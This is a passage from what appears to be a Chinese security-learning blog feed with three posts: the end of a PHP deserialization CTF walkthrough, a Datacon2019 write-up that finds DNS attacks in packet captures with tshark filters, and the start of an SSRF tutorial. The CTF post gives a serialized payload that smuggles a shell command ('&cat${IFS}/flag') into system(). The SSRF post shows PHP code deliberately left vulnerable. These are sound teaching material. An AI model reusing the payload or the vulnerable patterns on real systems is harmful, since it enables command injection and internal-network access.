<p><code>call_user_func_array()</code>内置方法的作用是调用一个指定方法，第一个参数要调用的函数，第二个参数是一个数组，用于给调用的函数传参。但是这里的第一个参数是用一个数组<code>array($this, $this-&gt;method)</code>来表示，意思就是数组的第一个元素表示是该方法所在的类，第二个元素就是方法名。而且if语句已经限定了<code>method</code>参数必须是<code>echos</code>。再来看看<code>echos</code>这个类方法。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echos</span>(<span class="params">$host</span>)</span>&#123;</span><br><span class="line">   system(<span class="string">&quot;echos <span class="subst">$host</span>&quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>system()</code>函数可以执行系统命令，而且<code>host</code>参数可控，于是判断这里存在命令注入漏洞。于是思路如下：</p>
<ol>
<li>
<p>通过反序列化控制method和args两个成员变量</p>
</li>
<li>
<p>method必须是echos不然通不过if判断</p>
</li>
<li>
<p>通过call_user_func_array()函数第一个参数调用本类中的echos方法，第二个参数给方法传参-</p>
</li>
<li>
<p>由于echos方法中的system函数的参数是拼接形参的，完成命令注入。</p>
</li>
</ol>
<p>根据顺序，先执行<code>__wakeup</code>再执行<code>__destruct</code>，<code>__wakeup</code>中对参数有一个过滤的处理：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">      <span class="keyword">$this</span>-&gt;args[$k] = <span class="keyword">$this</span>-&gt;waf(trim($v));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">   $str=preg_replace(<span class="string">&quot;/[&lt;&gt;*;|?\n ]/&quot;</span>,<span class="string">&quot;&quot;</span>,$str);</span><br><span class="line">   $str=str_replace(<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$str);</span><br><span class="line">   <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到它默认将<code>args</code>变量视为一个数组，对其进行了<code>foreach</code>，然后又对数组中的每个元素送去了waf进行过滤。这表明我们传入的<code>args</code>是一个数组。并且<code>args</code>中不允许出现<code>[&lt;&gt;*;|?\n ]</code>这些字符，以及<code>flag</code>关键词。</p>
<p>并且<code>echos</code>是一个错误的命令，所以综合以上两点，必须使用<code>&amp;</code>命令连接符。</p>
<p>构造反序列化类：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">come</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $method = <span class="string">&#x27;echos&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> $args = <span class="keyword">array</span>(<span class="string">&#x27;&amp;cat$&#123;IFS&#125;/flag)&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> come());</span><br></pre></td></tr></table></figure>
<p>得到payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:4:&quot;come&quot;:2:&#123;s:12:&quot;%00come%00method&quot;;s:5:&quot;echos&quot;;s:10:&quot;%00come%00args&quot;;a:1:&#123;i:0;s:16:&quot;&amp;cat$&#123;IFS&#125;&#x2F;flag)&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果PHP版本大于7.0，可以直接把private属性改成public</p>
</blockquote>
<h2 id="0x05-Reference">0x05 Reference</h2>
<p><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">一篇文章带你深入理解PHP反序列化漏洞</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzU5MzIyNTcxNA==&amp;mid=2247485916&amp;idx=1&amp;sn=ce338562a75b529b26d484fa90de031c&amp;chksm=fe12fb41c96572572618a816ca615d562d5a4965990122c40e82a1b8f9084bc0a9438286a37c&amp;mpshare=1&amp;scene=1&amp;srcid=&amp;sharer_sharetime=1585963011738&amp;sharer_shareid=247225a71986860a67a64293d2159472#rd">php反序列化那些事</a></p>
]]></content>
      <categories>
        <category>web安全</category>
        <category>基础学习</category>
      </categories>
      <tags>
        <tag>web安全基础</tag>
        <tag>PHP反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v1</title>
    <url>/Web_security/traffic_analysis/1.Datacon2019-q1-Writeup-v1/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v1">Datacon2019-q1-Writeup-v1</h1>
<h2 id="一、题目说明">一、题目说明</h2>
<ol>
<li>题目背景<br>
假如你是某网络的管理员，近日接到告警称，网络中存在 DNS 攻击行为，希望你进行调查。现捕获到网络中的 DNS 流量，请对其中的攻击行为进行分析。</li>
<li>题目要点<br>
DNS是互联网中重要的基础设施之一，对网络的稳定运行有至关重要的作用。然而，由于设计缺陷，DNS 存在诸多脆弱点，因此可被利用与诸多攻击。本题对常见的 DNS 安全问题进行考察。</li>
</ol>
<h2 id="二、知识储备">二、知识储备</h2>
<h3 id="DNS协议及报文格式">DNS协议及报文格式</h3>
<p>这篇<a href="https://jocent.me/2017/06/18/dns-protocol-principle.html#_label2">文章</a>对于DNS讲的还比较透彻，在此基础做一点摘要。</p>
<ul>
<li>
<p>域名层次结构<br>
域名层次</p>
</li>
<li>
<p>域名服务器<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406143519.png" alt=""><br>
另外还有一个本地域名服务器：当一个主机发出DNS查询请求的时候，这个查询请求首先就是发给本地域名服务器的。</p>
</li>
<li>
<p>域名解析过程</p>
<p>以查询<code>jocent.me</code>为例，其中10.74.36.90为主机IP，10.74.1.11为本地DNS服务器：<br/><br>
①主机10.74.36.90先向本地域名服务器10.74.1.11进行递归查询<br/><br>
②本地域名服务器采用迭代查询，向一个根域名服务器进行查询<br/><br>
③根域名服务器告诉本地域名服务器，下一次应该查询的顶级域名服务器<code>dns.me</code>的IP地址<br/><br>
④本地域名服务器向顶级域名服务器<code>dns.me</code>进行查询<br/><br>
⑤顶级域名服务器me告诉本地域名服务器，下一步查询权限服务器<code>dns.jocent.me</code>的IP地址<br/><br>
⑥本地域名服务器向权限服务器<code>dns.jocent.me</code>进行查询<br/><br>
⑦权限服务器<code>dns.jocent.me</code>告诉本地域名服务器所查询的主机的IP地址<br/><br>
⑧本地域名服务器最后把查询结果告诉 10.74.36.90<br/><br>
其中有两个概念递归查询和迭代查询:<br>
<strong>递归查询</strong>：本机向本地域名服务器发出一次查询请求，就静待最终的结果。如果本地域名服务器无法解析，自己会以DNS客户机的身份向其它域名服务器查询，直到得到最终的IP地址告诉本机。<br/><br>
<strong>迭代查询</strong>：本地域名服务器向根域名服务器查询，根域名服务器告诉它下一步到哪里去查询，然后它再去查，每次它都是以客户机的身份去各个服务器查询。</p>
</li>
<li>
<p>报文格式<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406143746.png" alt=""></p>
</li>
</ul>
<h3 id="a-id-ANY-DNS资源记录ANY类型"><a id='ANY'> <strong>DNS资源记录ANY类型</strong></h3>
<p>为什么在DDOS方法攻击的时候需要指定ANY类型参数，我们使用dig命令来看一下具体情况：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144123.png" alt=""><br>
可以看到，DNS服务器返回了该服务器中所有关于<code>163.com</code>的资源记录，包括类型A，NS，MX，TXT，这样就使得响应数据包远远大于请求数据包。<br>
我们不妨再往深层次想一想，已知UDP数据包的最大长度是512字节，也就是说当DNS响应数据大于512字节的时候，数据只返回512字节，剩余的数据将被丢弃。为什么在这个地方DNS的响应数据可以返回大于2000字节的数据呢？可以去查看请求数据包中的Additional Records有一条OPT类型的资源记录，OPT类型是一种一个“伪 DNS记录类型”以支持 EDNS协议，其中<code>UDP Payload Size</code>字段可以指定DNS返回报文的最大长度。<a href="http://blog.hnxiezan.com/blog/post/1/">这里</a>对EDNS有比较详细的解释。</p>
<h3 id="DNS攻击类型">DNS攻击类型</h3>
<p><a href="https://securitytrails.com/blog/most-popular-types-dns-attacks">这里</a>有对DNS的各种攻击类型的介绍。</p>
<h3 id="dns-flags-opt常见的值"><code>dns.flags.opt</code><strong>常见的值</strong></h3>
<ul>
<li>
<p>dns.flags.opcode=0(只显示DNS常规查询消息，以及相应的DNS响应消息)</p>
</li>
<li>
<p>dns.flags.opcode=1(只显示DNS逆向查询消息，以及相应的DNS响应消息)</p>
</li>
<li>
<p>dns.flags.opcode=2(只显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息)</p>
</li>
<li>
<p>dns.flags.opcode=5(只显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息）</p>
</li>
</ul>
<h3 id="DNS资源记录（RR）类型——NS和SOA">DNS资源记录（RR）类型——NS和SOA</h3>
<p><a href="https://www.cnblogs.com/comefuture/p/7543752.html">NS和SOA的区别</a></p>
<p><strong>SOA</strong>，即Start Of Authority，放在 zone file 中，用于描述这个 zone 负责的 name server，version number…等资料，以及当 slave server 要备份这个 zone 时的一些参数。每个 zone file 中必须有且仅有一条 SOARR ，并在 zone file 中作为第一条资源记录保存。</p>
<h3 id="DNS资源记录（RR）类型——AXFR和IXFR">DNS资源记录（RR）类型——AXFR和IXFR</h3>
<p>AXFR（完全区域传输 252）：由主域名服务器转移整个区域文件至辅助域名服务器。</p>
<p>IXFR（增量区域传输 251）：请求只有与先前流水式编号不同的特定区域的区域转移。此请求有机会被拒绝，如果权威服务器由于配置或缺乏必要的数据而无法履行请求，一个完整的（AXFR）会被发送以作回应。</p>
<p><a href="https://www.cnblogs.com/cyjaysun/p/4265240.html">详细介绍</a></p>
<h3 id="DNSSEC协议">DNSSEC协议</h3>
<p><a href="https://bbs.huaweicloud.com/blogs/1f0fba3f514e11e9bd5a7ca23e93a891">浅谈DNS域名安全扩展协议DNSSEC</a></p>
<hr>
<h2 id="三、解题过程">三、解题过程</h2>
<h3 id="1-子域名爆破攻击">1.子域名爆破攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p><a href="https://www.secpulse.com/archives/55823.html">传送门</a></p>
</li>
<li>
<p>发现过程<br>
首先，用 Wireshark 打开 pcap 包，绘制 IO Graphs：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145336.png" alt=""><br>
可见，在 5500 - 6000s 中出现了异常的峰值流量，将5500s到6000s所有请求、响应提取到新的 pcap文件。</p>
<p>接下来使用 协议分级 查看哪些协议占比最多：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144222.png" alt=""><br>
可以看到，切出来的包里面仅有DNS协议，而且用户主动发送的数据包占比最大。<br>
查看分组长度<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144233.png" alt=""><br/><br>
<strong>长度为1280~2559字节的数据包通常表示数据传输，长度较小的数据包则表示协议控制序列</strong></p>
<p>以请求数量从高到低的 IP 地址进行排序。<br>
<strong>方法一(速度很慢)：</strong><br>
使用wireshark的统计功能，并且用<code>dns.flags.response == 0</code>进行筛选(只看DNS查询报文)：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144251.png" alt=""><br/><br>
<strong>方法二：</strong></p>
<p>使用tshark命令行进行筛选<code>tshark -r timeTop.pcap -T fields -e ip.src -e ip.dst | tr &quot;\t&quot; &quot;\n&quot; | sort | uniq -c | sort -nr &gt; ipRank.txt</code></p>
<p>参数解释：</p>
<p>-r 指定目标文件</p>
<p>-Y 指定过滤规则</p>
<p>-T pdml|ps|text|fields|psml,设置解码结果输出的格式，包括text,ps,psml和pdml，默认为text</p>
<p>-e  如果-T fields选项指定，-e用来指定输出哪些字段</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144308.png" alt=""><br>
首先查看第一个IP 45.80.170.1：<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144331.png" alt=""><br>
可以看到这个IP地址是一个DNS服务。<br>
再来查看第二个IP 144.202.64.226：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144341.png" alt=""><br>
144.202.64.226 发起了大量针对<code>b0e.com.cn</code>域名的查询请求，且大部分相应结果均为 No such name，因此判断此类攻击为子域名爆破攻击。<br>
通过观察，可以发现，前 10 个请求并不是域名爆破攻击，去掉该 10 个请求后，第一类攻击共有 34184 个。</p>
</li>
</ul>
<h3 id="2-DDOS反射放大攻击">2. DDOS反射放大攻击</h3>
<ul>
<li>
<p>攻击原理<br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144404.png" alt=""></p>
<ul>
<li>流量放大：利用回复包比请求包大的特点</li>
<li>地址伪造：伪造请求包的源地址为攻击目标</li>
<li>分布式：多个 DNS 同时向攻击目标返回大量响应</li>
</ul>
</li>
<li>
<p>攻击特征</p>
<ul>
<li>通过递归查询从而放大流量，因此recursion=1，ANY参数（<a href="#ANY">为什么必须是ANY参数</a>）。</li>
<li>要求返回包远远大于发送包，一般返回包的要求大于3000。即dns.rr.udp_payload_size&gt;=3000。</li>
</ul>
</li>
<li>
<p>发现过程<br>
通过攻击特征可以得出筛选条件<code>dns.flags.response == 0 &amp;&amp; dns.flags.recdesired == 1 &amp;&amp; dns.qry.type == 255 &amp;&amp; dns.rr.udp_payload_size &gt;= 3000</code>，再对筛选后的IP地址进行统计：<code>tshark -r q1_final.pcap -Y &quot;dns.flags.recdesired==1 &amp;&amp; dns.flags.response==0 &amp;&amp; dns.rr.udp_payload_size&gt;=3000 &amp;&amp; dns.qry.type==255&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c| sort -nr|more</code><br>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144423.png" alt=""><br>
这样就过滤出了 DNS 服务响应数据了，一共有188.141.167.218，187.199.129.12，70.85.232.160，45.80.170.1四个DNS服务器，接着排除不支持 <strong>ANY</strong> 的 DNS 服务器，也就是 Refused：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144436.png" alt=""></p>
<p>排查之后，可知攻击IP（也就是排除目的IP为45.80.170.1的源IP）：127.130.104.152，175.222.102.169，105.191.150.205。</p>
</li>
</ul>
<h3 id="3-非法DNS-动态更新攻击">3. 非法DNS 动态更新攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc771255(v=ws.11)">这里</a>对DNS Dynamic Update有比较详细的介绍。简单地来说，DNS 客户端在 IP 地址或名称出现更改的任何时候都可利用 DNS 服务器来注册和动态更新其资源记录，攻击者可以利用 IP 欺骗伪装成 DNS 服务器信任的主机对区数据进行添加、删除和替换。</p>
</li>
<li>
<p>攻击特征：</p>
<ul>
<li><code>dns.flags.opt==5</code>显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息</li>
</ul>
</li>
<li>
<p>发现过程</p>
<p>使用tshark命令筛选：<code>tshark -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -nr|more </code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144450.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144507.png" alt=""></p>
<p>可以看到，有四个攻击IP：19.220.251.87 414，200.152.141.106 15，18.100.48.86 4091，237.205.156.233 535</p>
</li>
</ul>
<h3 id="4-非法DNS域传输攻击">4. 非法DNS域传输攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p>辅 DNS 服务器，需要与主 DNS 服务器进行通信，加载数据信息，称为区域传送（Zone Transfer）。AXFR 请求，常导致全区域传送，需要花费大量的时间与带宽。</p>
<p>大量的 AXFR 、IXFR请求，可导致 DDoS。权限配置不当，可导致信息泄露（测试域名、内部域名）。</p>
</li>
<li>
<p>攻击特征</p>
<p><code>dns.flags.repsonse==0 &amp;&amp; dns.qry.type==252 || dns.qry.type==251</code></p>
</li>
<li>
<p>发现过程</p>
<p>我们用过滤器<code>dns.qry.type in &#123;251 252&#125;</code>把AXFR和IXFR过滤出来，查看有哪些疑似攻击IP</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144519.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144531.png" alt=""></p>
<p>有两个221.223.19.169 和一个129.191.74.107 发来的域传送请求包，以及大量的96.199.230.176 发来的域传送请求包。仔细检查一下前两个IP地址的数据包后，我们认为前面两个有可能是管理员配置不当等造成的，<br>
而最后的一个大量的请求数据包显然就是域传送攻击了。</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144544.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144555.png" alt=""></p>
</li>
</ul>
<h3 id="5-DNSSec-NSec-域名遍历攻击">5. DNSSec NSec 域名遍历攻击</h3>
<ul>
<li>
<p>攻击原理</p>
<p><a href="https://www.cloudxns.net/Support/detail/id/1309.html">DNSSec的概念与作用</a></p>
<p><a href="https://info.menandmice.com/blog/bid/73645/Take-your-DNSSEC-with-a-grain-of-salt">NSEC：Walking a DNS zone</a></p>
<p>NSEC枚举这是针对DNSSEC的一种攻击，在未使用NSEC3的DNSSEC中，若查询区文件中不存在的域名，会以NSEC记录的形式提供靠近其的最近的下一条域名，这就造成了可能构造特殊请求，来遍历区文件，造成区文件的泄露。</p>
</li>
<li>
<p>攻击特征</p>
<p>域名遍历攻击依赖于NSec资源记录类型，可以使用``dns.resp.type==47`进行初步筛选</p>
</li>
<li>
<p>发现过程</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144609.png" alt=""></p>
<p>可以看到我们把ANY反射型Dos攻击也筛选出来了，于是再加上<code>not dns.qry.type==255</code>条件就可以得到DNSSec NSec 域名遍历攻击IP：6.116.183.244</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144624.png" alt=""></p>
</li>
</ul>
<hr>
<h2 id="四、Q-A">四、Q&amp;A</h2>
<ol>
<li>
<p>pacp包文件过大，Wireshark加载失败</p>
<p>解决办法：使用 <code>editcap -c &lt;packets per file&gt; 原始文件.pcap 输出文件.pcap</code> 命令；或者使用<code>tcpdump -r old_file -w new_files -C 10</code>，在这个例子中，每个文件的大小是10 million字节。</p>
</li>
<li>
<p>bash管道格式化输出命令</p>
<ul>
<li><a href="https://blog.csdn.net/u010003835/article/details/80752797">tr</a></li>
<li><a href="https://www.jianshu.com/p/291632a11ede">sort -nc</a></li>
<li><a href="https://blog.csdn.net/u014756827/article/details/78949924">sort | uniq -c</a></li>
<li><a href="https://www.cnblogs.com/xiaoleiel/p/8349487.html">awk</a></li>
<li><a href="https://www.runoob.com/linux/linux-comm-more.html">more</a></li>
<li><a href="https://www.cnblogs.com/blogoflee/archive/2012/02/10/2344939.html">wc</a></li>
</ul>
</li>
<li>
<p>几个经常用到的DNS显示过滤器的实例</p>
<ul>
<li><code>dns.flags.response=0</code>(DNS查询消息)</li>
<li><code>dns.flags.response=1</code>(DNS响应消息)</li>
<li><code>dns.flags.rcode=0</code>(显示RCODE字段值为0(Noerror)的DNS应答消息)</li>
<li><code>dns.flags.rcode=3</code>(显示RCODE字段值为3(NXDomain,表示域名不存在)的DNS应答消息)</li>
<li><code>dns.flags.opcode=0</code>(显示DNS常规查询消息，以及相应的DNS响应消息)</li>
<li><code>dns.flags.opcode=1</code>(显示DNS逆向查询消息，以及相应的DNS响应消息)</li>
<li><code>dns.flags.opcode=2</code>(显示DNS服务器状态请求查询消息，以及相应的DNS服务器状态响应消息)</li>
<li><code>dns.flags.opcode=5</code>(显示DNS动态更新查询消息，以及相应的DNS动态更新响应消息)</li>
<li><code>dns.flags.recdesired=1</code>(RD标记位置1的DNS查询消息一般为主机发出，目的是要求接受该消息的DNS服务器执行递归查询)</li>
<li><code>dns.flags.recdesired=0</code>(显示RD标记位置0的DNS递归反复查询及响应消息)</li>
</ul>
</li>
<li>
<p>常用的查询字段</p>
<table>
<thead>
<tr>
<th>字段</th>
<th>描述</th>
<th>字段</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>frame.len</td>
<td>数据长度</td>
<td>dns.flags.authenticated</td>
<td>服务器是否为域权威服务器</td>
</tr>
<tr>
<td>ip.src</td>
<td>源IP</td>
<td>dns.flags.checkisable</td>
<td>非认证数据是否可接收</td>
</tr>
<tr>
<td>ip.dst</td>
<td>目的IP</td>
<td>dns.flags.rcode</td>
<td>DNS reply code</td>
</tr>
<tr>
<td>udp.srcport</td>
<td>源udp端口号</td>
<td>dns.count.quires</td>
<td>数据包中DNS请求数</td>
</tr>
<tr>
<td>udp.dstport</td>
<td>目的udp端口号</td>
<td>dns.count.answers</td>
<td>数据包中DNS回答数</td>
</tr>
<tr>
<td>eth.src</td>
<td>源MAC地址</td>
<td>dns.count.auth_rr</td>
<td>数据包中权威记录数</td>
</tr>
<tr>
<td>eth.dst</td>
<td>目的MAC地址</td>
<td>dns.count.add_rr</td>
<td>数据包中额外记录数</td>
</tr>
<tr>
<td><a href="http://dns.id">dns.id</a></td>
<td>DNS Transaction ID</td>
<td><a href="http://dns.qry.name">dns.qry.name</a></td>
<td>DNS请求名</td>
</tr>
<tr>
<td>dns.flags.response</td>
<td>DNS请求/现有响应标志</td>
<td>dns.qry.class</td>
<td>DNS请求类型</td>
</tr>
<tr>
<td>dns.flags.opcode</td>
<td>DNS opcode</td>
<td><a href="http://dns.resp.name">dns.resp.name</a></td>
<td>DNS响应名</td>
</tr>
<tr>
<td>dns.flags.authoritative</td>
<td>应答是否被服务器认证</td>
<td>dns.resp.type</td>
<td>DNS回复类型</td>
</tr>
<tr>
<td>dns.flags.truncated</td>
<td>消息是否被截断</td>
<td>dns.resp.ttl</td>
<td>DNS响应生存时间</td>
</tr>
<tr>
<td>dns.flags.recdesired</td>
<td>是否递归查询</td>
<td><a href="http://dns.resp.z.do">dns.resp.z.do</a></td>
<td>DNS是否支持DNSSEC</td>
</tr>
<tr>
<td>dns.flags.reavail</td>
<td>服务器是否能递归查询</td>
<td>frame.time_relative</td>
<td>frame相对时间</td>
</tr>
</tbody>
</table>
</li>
<li>
<p>常用查询字段类型</p>
<table>
<thead>
<tr>
<th>TYPE</th>
<th>值</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>A</td>
<td>1</td>
<td>主机地址</td>
</tr>
<tr>
<td>NS</td>
<td>2</td>
<td>权威服务器</td>
</tr>
<tr>
<td>CNAME</td>
<td>5</td>
<td>别名的正则名称</td>
</tr>
<tr>
<td>SOA</td>
<td>6</td>
<td>标记权威区域的开始</td>
</tr>
<tr>
<td>PTR</td>
<td>12</td>
<td>域名指针</td>
</tr>
<tr>
<td>MX</td>
<td>15</td>
<td>邮件交换</td>
</tr>
<tr>
<td>TXT</td>
<td>16</td>
<td>文本字符串</td>
</tr>
<tr>
<td>DS</td>
<td>43</td>
<td>委托签发者</td>
</tr>
<tr>
<td>IXFR</td>
<td>251</td>
<td>增量区域转移</td>
</tr>
<tr>
<td>AXFR</td>
<td>252</td>
<td>权威区域转移</td>
</tr>
<tr>
<td>*</td>
<td>255</td>
<td>所有解析记录，也成为ANY</td>
</tr>
</tbody>
</table>
</li>
</ol>
<hr>
<h2 id="五、总结与反思">五、总结与反思</h2>
<p>看了很多大佬们写的Writeup，照葫芦画瓢复现了DNS恶意流量分析，期间遇到了不少的困难，比如：</p>
<ul>
<li>对DNS协议了解很少</li>
<li>数据包非常大，没有攻击流量的标注</li>
<li>对流量分析基本是零起步，不知道该从哪里开始分析，没有一个合理的逻辑思维</li>
</ul>
<p>经过这一轮的复现之后，可以说对流量分析有了一定的了解，知道了一些DNS的攻击手段以及攻击特征，还有若干非常实用的文件处理命令。但是，依然存在很多不足，所以打算以<a href="https://github.com/shyoshyo/DataCon-9102-DNS">shyoshyo</a>撰写的Writeup为模板，有条理、有逻辑的进行第二轮流量分析。</p>
]]></content>
      <categories>
        <category>流量分析</category>
        <category>比赛题</category>
      </categories>
      <tags>
        <tag>Wireshark</tag>
        <tag>流量分析</tag>
        <tag>DNS</tag>
        <tag>Datacon2019</tag>
      </tags>
  </entry>
  <entry>
    <title>Web安全基础学习之SSRF漏洞利用</title>
    <url>/Web_security/basic_learning/17.SSRF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Web安全基础学习之SSRF漏洞利用">Web安全基础学习之SSRF漏洞利用</h1>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191206123722.png" alt=""></p>
<h2 id="什么是ssrf">什么是ssrf</h2>
<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p>
<p>简单来讲就是，服务器会响应用户的url请求，但是没有做好过滤和限制，导致可以攻击内网。</p>
<h2 id="漏洞产生">漏洞产生</h2>
<p>由于服务端提供了从其他服务器应用获取数据的功能且没有对用户可控的目标地址做过虑与限制。</p>
<p>在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数。</p>
<h3 id="file-get-contents">file_get_contents()</h3>
<p>file_get_contents是把文件写入字符串，当把url是内网文件的时候，他会先去把这个文件的内容读出来再写入，导致了文件读取。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $content=file_get_contents($_POST[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">    $filename=<span class="string">&#x27;./images/&#x27;</span>.rand().<span class="string">&#x27;.img&#x27;</span>;\</span><br><span class="line">    file_put_contents($filename,$content);</span><br><span class="line">    <span class="keyword">echo</span> $_POST[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    $img=<span class="string">&quot;&lt;img src=\&quot;&quot;</span>.$filename.<span class="string">&quot;\&quot;/&gt;&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $img;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="fsockopen">fsockopen()</h3>
<p><code>fsockopen()</code>函数本身就是打开一个网络连接或者Unix套接字连接。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$host=$_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">$fp = fsockopen(<span class="string">&quot;<span class="subst">$host</span>&quot;</span>, <span class="number">80</span>, $errno, $errstr, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span> (!$fp) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br /&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $out = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line">    $out .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>;</span><br><span class="line">    fwrite($fp, $out);</span><br><span class="line">    <span class="keyword">while</span> (!feof($fp)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> fgets($fp, <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="curl">curl()</h3>
<p>这应该是大家最熟悉的一个函数了，因为利用方式很多最常见的是通过file、dict、gopher这三个协议来进行渗透，接下来也主要是集中讲对于<code>curl()</code>函数的利用方式。</p>
<blockquote>
<p>这里一定要安装PHP的curl扩展！！！Windows环境下php-study用多了，到了Linux环境都不知道怎么搭环境了。（折腾了一下午发现没有安装php-curl…==）<a href="https://segmentfault.com/a/1190000009068818">https://segmentfault.com/a/1190000009068818</a></p>
</blockquote>
